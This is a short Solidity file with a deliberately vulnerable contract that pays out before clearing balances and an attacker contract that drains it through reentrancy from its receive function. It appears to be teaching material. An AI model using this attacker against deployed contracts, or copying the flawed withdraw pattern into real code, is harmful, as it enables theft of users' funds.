// Vulnerable contract
contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}

// Attacker contract
contract Attacker {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // Fallback function used to call back into vulnerable
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }
}